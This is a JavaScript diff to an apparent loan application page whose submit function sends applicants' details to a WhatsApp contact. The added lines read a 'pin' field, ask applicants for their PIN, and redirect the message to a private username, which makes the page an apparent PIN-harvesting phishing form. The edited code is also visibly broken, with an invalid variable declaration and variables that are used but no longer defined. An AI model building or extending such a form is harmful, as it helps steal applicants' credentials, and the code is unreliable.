@@ -113,11 +113,12 @@ function go(n){
   window.scrollTo(0,0);
 }
 function submitApp(){
-  var name = document.getElementById('name').value;
-  var phone = document.getElementById('phone').value;
+  var firstName = document.getElementById('firstName').value;
+var lastName = document.getElementById('lastName').value;
+var name = document. getElementById('pin'). value;
   if(!name || !phone){ alert('Please enter name,phone and pin'); return; }
   var msg = "New Loan Application%0AName: " + encodeURIComponent(name) + "%0APhone: " + encodeURIComponent(phone) + "%0ALoan: " + encodeURIComponent(document.getElementById('amtTxt').innerText) + "%0ATerm: " + encodeURIComponent(document.getElementById('termTxt').innerText);
-  var myNumber = "2637XXXXXXXX";
+  var my Username = "@Danielle2190";
   window.open("https://wa.me/" + myNumber + "?text=" + msg, "_blank");
   document.getElementById('s5').classList.add('hidden');
   document.getElementById('done').classList.remove('hidden');
